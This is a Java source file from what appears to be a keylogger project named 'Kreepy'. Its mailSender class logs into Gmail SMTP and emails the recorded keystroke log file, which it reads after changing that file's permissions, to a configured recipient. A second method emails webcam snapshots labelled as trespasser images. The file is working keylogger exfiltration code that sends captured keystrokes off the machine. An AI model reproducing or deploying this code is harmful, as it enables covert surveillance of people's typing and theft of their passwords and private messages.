import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Store;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;

public class mailSender {
    private String username;
    private String password;
    private String recipent;
    private String subject;
    private String bodyText;
    private Session session;
    FilePermissions fp;

    public mailSender(String username, String password, String recipent_details) {
        fp = new FilePermissions();
        this.username = username;
        this.password = password;
        this.recipent = recipent_details;
        this.subject = "Kreepy::The Keylogger";
        InitializeEmailer();
    }

    public void setSubject(String subject) {
        this.subject = subject;
    }

    public String getSubject() {
        return this.subject;
    }

    public void setBody(String bodyText) {
        this.bodyText = bodyText;
    }

    public String getBody() {
        return this.bodyText;
    }

    public void InitializeEmailer() {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        //Using Transport Layer Security TLS Protocol
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        session = Session.getInstance(props,

                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });
    }

    public void sendKeystrokesReport() throws AddressException, MessagingException, IOException {
        Message message = new MimeMessage(session);
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipent));

        message.setSubject("Kreepy::KeyStrokes Report");

        MimeMultipart multipart = new MimeMultipart("related");
        BodyPart messageBodyPart = new MimeBodyPart();

        StringBuilder sb = new StringBuilder();
        sb.append("<html>");
        sb.append("<h1>");
        sb.append("<u>");
        sb.append("<b>");
        sb.append("<i>");
        sb.append("Kreepy::KeyStroke Monitoring System Report");
        sb.append("</i>");
        sb.append("</b>");
        sb.append("</u>");
        sb.append("</h1>");
        sb.append("</html>");


        String htmlText = sb.toString();
        messageBodyPart.setContent(htmlText, "text/html");
        multipart.addBodyPart(messageBodyPart);

        messageBodyPart = new MimeBodyPart();
        String mainContent = "Kreepy always tries to provide with you with the most accurate and genuine"
                + "records.Thank you for being with us.The keystroke report is attached.\n\n" + "Safe & Secure"
                + " monitoring always...\n\n@Kreepy Team";
        messageBodyPart.setText(mainContent);

        multipart.addBodyPart(messageBodyPart);
        
        DataSource fds = new FileDataSource(getKeystrokeFile());

        messageBodyPart.setDataHandler(new DataHandler(fds));
        messageBodyPart.setFileName("Kreepy::KeyStroke Logging Report");
        multipart.addBodyPart(messageBodyPart);
        message.setContent(multipart);
        Transport.send(message);
        System.out.println("Sent message successfully....");
    }


    public File getKeystrokeFile() throws IOException {
        File f = new File("lib/docs/Logger_Keys.txt");
        fp.GrantFilePermissions(f);

        File temp = new File("temp.txt");
        FileWriter fw = null;
        fw = new FileWriter(temp);
        BufferedWriter bw = new BufferedWriter(fw);
        PrintWriter pw = new PrintWriter(bw);
        pw.println("Kreepy::KEYSTROKE RECORDER SERVICE  #It Matters");
        FileReader fr = null;
        fr = new FileReader(f);
        BufferedReader br = new BufferedReader(fr);

        String textLine = br.readLine();      //First Line is blank

        while ((textLine = br.readLine()) != null) {
            if (textLine.startsWith("cntrl_lognote")) {
                //Application name is here
                textLine = textLine.substring(textLine.indexOf(' ') + 1);
                pw.println(textLine);

            } else {
                pw.println(textLine);
            }
        }

        br.close();
        pw.close();
        bw.close();

        fp.RevokeFilePermissions(f);
        return temp;
    }

    public void sendEmail() {
        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("kreepy.care@gmail.com"));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipent));
            message.setSubject(this.getSubject());
            MimeMultipart multipart = new MimeMultipart("related");
            BodyPart messageBodyPart = new MimeBodyPart();
            StringBuilder sb = new StringBuilder();
            sb.append("<html>");
            sb.append("<h1>");
            sb.append("<u>");
            sb.append("<b>");
            sb.append("<i>");
            sb.append(this.getBody());
            sb.append("</i>");
            sb.append("</b>");
            sb.append("</u>");
            sb.append("</h1>");
            sb.append("</html>");


            String htmlText = sb.toString();
            messageBodyPart.setContent(htmlText, "text/html");
            multipart.addBodyPart(messageBodyPart);
            messageBodyPart = new MimeBodyPart();

            int ctr = 1;
            try {
                BufferedReader br = new BufferedReader(new FileReader("lib/docs/webcamshot_serialno.txt"));
                try {
                    ctr = Integer.parseInt(br.readLine());
                } catch (NumberFormatException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            //ctr = ctr-1;

            DataSource fds = new FileDataSource("lib/webcam_pics_failedAttempts/webcampic_" + ctr + ".png");

            messageBodyPart.setDataHandler(new DataHandler(fds));

            messageBodyPart.setFileName("Kreepy::Trespasser Image");
            multipart.addBodyPart(messageBodyPart);
            message.setContent(multipart);
            Transport.send(message);

            System.out.println("Sent message successfully....");
            System.out.println("Done");

        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }
}

